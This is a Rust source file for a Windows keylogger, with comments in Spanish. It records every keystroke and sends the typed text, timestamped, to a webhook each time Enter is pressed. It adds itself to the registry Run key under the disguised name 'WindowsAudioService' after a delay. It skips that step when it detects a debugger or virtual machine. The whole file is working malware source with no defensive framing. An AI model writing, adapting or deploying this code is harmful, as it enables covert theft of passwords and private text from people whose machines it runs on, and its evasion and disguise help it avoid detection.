//#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
use device_query::{DeviceQuery, DeviceState, Keycode};
use chrono::Local;
use std::{thread, time};
use reqwest::blocking::Client;
use serde_json::json;
use winreg::{RegKey, enums::*};
use std::time::Duration;
//ur webhuk
const WEBHOOK_URL: &str = "tuwebhook";


fn main() {
    let device_state = DeviceState::new();
    let mut last_keys = vec![];
    let mut key_buffer: Vec<String> = vec![];

    std::thread::spawn(|| {
        thread::sleep(Duration::from_secs(30)); // Delay de 30 segundos
        let _ = setup_registry_persistence();
    });

    loop {
        let keys = device_state.get_keys();

        if keys != last_keys {
            for key in &keys {
                if !last_keys.contains(key) {
                    match key {
                        Keycode::Enter => {
                            if !key_buffer.is_empty() {
                                let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                                let text = key_buffer.join("");
                                let payload = format!("[{}] {}", now, text);
                                enviar_wehuk(&payload);
                                key_buffer.clear();
                            }
                        }
                        Keycode::Space => key_buffer.push(" ".to_string()),
                        Keycode::Backspace => {
                            key_buffer.pop();
                        }
                        Keycode::LControl => {
                            let _ = remove_persistence();
                            return;
                        }
                        Keycode::Semicolon => key_buffer.push("ñ".to_string()),
                        _ => {
                            let key_name = format!("{:?}", key);
                            if key_name.len() == 1 {
                                key_buffer.push(key_name);
                            }
                        }
                    }
                }
            }

            last_keys = keys;
        }

        thread::sleep(time::Duration::from_millis(50));
    }
}

fn enviar_wehuk(message: &str) {
    let client = Client::new();
    let payload = json!({ "content": message });

    let res = client.post(WEBHOOK_URL)
        .json(&payload)
        .send();

    if let Err(e) = res {
        eprintln!("Error al enviar webhook: {}", e);
    }
}

//Persistencia en Registry :V

fn setup_registry_persistence() -> Result<(), Box<dyn std::error::Error>> {
    // 1. Esperar condiciones seguras
    if !is_safe_environment() {
        return Ok(());
    }
    
    // 2. Obtener ruta del ejecutable actual
    let current_exe = std::env::current_exe()?;
    let exe_path = current_exe.to_string_lossy();
    let registry_value = if exe_path.contains(' ') {
        format!("\"{}\"", exe_path)  // COMILLAS IMPORTANTES
    } else {
        exe_path.to_string()
    };
    
    // 3. Acceder al Registry del usuario actual (HKCU)
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    // 4. Abrir o crear la clave Run
    let (run_key, _) = hkcu.create_subkey(run_path)?;
    
    // 5. Verificar si ya está instalado
    if run_key.get_value::<String, _>("WindowsAudioService").is_ok() {
        return Ok(()); // Ya existe, no hacer nada
    }
    
    // 6. Esperar antes de escribir en registry
    thread::sleep(Duration::from_secs(10));
    
    // 7. Establecer el valor en el registry
    run_key.set_value("WindowsAudioService", &registry_value.to_string())?;
    
    println!("[DEBUG] Persistencia establecida en Registry");
    Ok(())
}


fn is_safe_environment() -> bool {
    // Verificaciones básicas de seguridad
    !is_debugger_present() && !is_virtual_machine()
}

fn is_debugger_present() -> bool {
    // Detección simple de debugger
    unsafe { winapi::um::debugapi::IsDebuggerPresent() != 0 }
}

fn is_virtual_machine() -> bool {
    // Detección básica de VM
    if let Ok(modules) = std::fs::read_dir("C:\\Windows\\System32") {
        for module in modules.flatten() {
            if let Some(name) = module.file_name().to_str() {
                if name.to_lowercase().contains("vmware") 
                    || name.to_lowercase().contains("vbox") 
                    || name.to_lowercase().contains("qemu") {
                    return true;
                }
            }
        }
    }
    false
}

fn remove_persistence() -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    let run_key = hkcu.open_subkey(run_path)?;
    
    // Eliminar el valor si existe
    if run_key.get_value::<String, _>("WindowsAudioService").is_ok() {
        run_key.delete_value("WindowsAudioService")?;
        println!("Persistencia eliminada del Registry");
    }
    
    Ok(())
}